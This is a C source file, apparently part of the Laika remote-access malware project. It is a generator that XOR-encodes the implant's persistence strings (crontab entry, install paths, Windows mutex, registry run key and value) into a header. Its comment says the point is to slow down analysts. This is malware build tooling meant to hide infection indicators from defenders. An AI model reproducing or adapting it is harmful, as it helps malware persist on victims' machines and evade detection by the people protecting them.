#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <inttypes.h>

#include "lmem.h"
#include "lvm.h"
#include "lbox.h"
#include "lsodium.h"

#define ERR(...) do { printf(__VA_ARGS__); exit(EXIT_FAILURE); } while(0);
#define RANDBYTE (rand() % UINT8_MAX)

static const char *PREAMBLE = "/* file generated by VMBoxGen, see tools/vmboxgen/src/main.c */\n#ifndef LAIKA_VMBOX_CONFIG_H\n#define LAIKA_VMBOX_CONFIG_H\n\n";
static const char *POSTAMBLE = "\n#endif\n";

void writeArray(FILE *out, uint8_t *data, int sz) {
    int i;

    fprintf(out, "{");
    for (i = 0; i < sz-1; i++) {
        fprintf(out, "0x%02x, ", data[i]);
    }
    fprintf(out, "0x%02x};\n", data[sz-1]);
}

void writeDefineArray(FILE *out, char *ident, uint8_t *data) {
    fprintf(out, "#define %s ", ident);
    writeArray(out, data, LAIKA_VM_CODESIZE);
}


void writeDefineVal(FILE *out, char *ident, int data) {
    fprintf(out, "#define %s 0x%02x\n", ident, data);
}

void addPadding(uint8_t *data, int start) {
    int i;

    /* if the box is less than LAIKA_VM_CODESIZE, add semi-random padding */
    for (i = start; i < LAIKA_VM_CODESIZE; i++) {
        data[i] = RANDBYTE;
    }
}

void makeSKIDdata(char *data, int sz, uint8_t *buff, int key) {
    int i;

    for (i = 0; i < sz; i++)
        buff[i] = data[i] ^ key;

    buff[i++] = key; /* add the null terminator */
    addPadding(buff, i);
}

#define MAKESKIDDATA(macro) \
    key = RANDBYTE; \
    makeSKIDdata(macro, strlen(macro), tmpBuff, key); \
    writeDefineVal(out, "KEY_" #macro, key); \
    writeDefineArray(out, "DATA_" #macro, tmpBuff);

int main(int argv, char **argc) {
    uint8_t tmpBuff[LAIKA_VM_CODESIZE];
    int key;
    FILE *out;

    if (argv < 2)
        ERR("USAGE: %s [OUTFILE]\n", argv > 0 ? argc[0] : "BoxGen");

    if ((out = fopen(argc[1], "w+")) == NULL)
        ERR("Failed to open %s!\n", argc[1]);

    srand(time(NULL)); /* really doesn't need to be cryptographically secure, the point is only to slow them down */

    fprintf(out, PREAMBLE);
    /* linux */
    MAKESKIDDATA(LAIKA_LIN_LOCK_FILE);
    MAKESKIDDATA(LAIKA_LIN_INSTALL_DIR);
    MAKESKIDDATA(LAIKA_LIN_INSTALL_FILE);
    MAKESKIDDATA(LAIKA_LIN_CRONTAB_ENTRY);
    /* windows */
    MAKESKIDDATA(LAIKA_WIN_MUTEX);
    MAKESKIDDATA(LAIKA_WIN_INSTALL_DIR);
    MAKESKIDDATA(LAIKA_WIN_INSTALL_FILE);
    MAKESKIDDATA(LAIKA_WIN_REG_KEY);
    MAKESKIDDATA(LAIKA_WIN_REG_VAL);
    fprintf(out, POSTAMBLE);
    fclose(out);
    return 0;
}

#undef MAKEDATA